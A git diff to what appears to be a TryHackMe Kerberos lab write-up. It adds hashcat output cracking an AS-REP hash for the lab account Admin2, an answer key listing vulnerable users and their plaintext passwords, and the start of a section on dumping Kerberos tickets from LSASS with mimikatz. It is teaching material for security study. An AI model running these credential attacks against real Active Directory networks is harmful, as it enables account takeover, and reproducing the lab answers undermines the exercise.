@@ -737,7 +737,10 @@ For tips on supplying more work, see: https://hashcat.net/faq/morework
 Approaching final keyspace - workload adjusted.  
 
 $krb5asrep$23$User3@CONTROLLER.local:1cdb8fad81ad8cc69f4d3d8946e3948f$b65b26794976e1a6c0ee1f23bdafca28b677c4649eda4236f5dedb402ca57dbdced9b296615a7da20423efeaac6ad7fa2ddebd73db27bff3a9019642aeb1299620bef06ded048bb56b3cb0fba12c749504750fb4721bf7bdf9aba9708c15b72892905261b00dd97d8ad4fc50829264293d06241f30d0f519e2961ecbee33decf17ffc18e0d1c8f6fe3b2540c4aa158e3a5fc08d7398f52ee8b8279d184fc094a2eddf05d581067649c64e1d68ec04a06989a68b73f30da2874b956587c637c9a1ed0c152ad9d2f219b8bb1b19485c3ae582cce692a15b9a194f4909e3b17d32cc01770f970c450832df4d63d2c6a46f86b5a769a:Password3
-                                                 
+ 
+ 
+ $krb5asrep$23$Admin2@CONTROLLER.local:1ef62c55816e1768bb5e7c68970f6a2a$0786dccf4995a5eb8d1229906faaf821d8b1201b2224406d0ee4a3658d3a8e074d1a22473755e55e4e6e475c0e6e53d5bea7591f62867c9bf5072f706f664f3dadebb934d42bcb5b9d5aa78d432ed55af195d1334a2b5a6bb447391fe20aa46da438f2efc04ddf3d0c3ca083d904c492ff27280290bde79029f3e952b4aebc0753a05c870a5047901876af15eab375dbd90bcc7b55e79b0b68f7014544cf73cf66ec83c7284372743cd10367999cd666e360eba8406b60b9f88237c427a4ae9aff4e55d0ef80fa14ca7ae08e3ca07938844d37fb837400196ba5359c4c82637d7fd6d237af0e9cea03487977badefe41503e471a:P@$$W0rd2
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Kerberos 5, etype 23, AS-REP
@@ -763,3 +766,34 @@ Stopped: Wed Aug  4 19:43:53 2021
 - Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
 
 - Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
+
+### Questions
+
+
+What hash type does AS-REP Roasting use?
+: Kerberos 5 AS-REP etype 23
+
+Which User is vulnerable to AS-REP Roasting?
+: User3
+
+What is the User's Password?
+: Password3
+
+Which Admin is vulnerable to AS-REP Roasting?
+: Admin2
+
+What is the Admin's Password?
+: P@$$W0rd2
+
+
+Pass the Ticket with mimikatz
+=============================================================================================================================================
+
+*Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory
+
+This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.
+
+You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.*
+
+### Pass the Ticket Overview
+
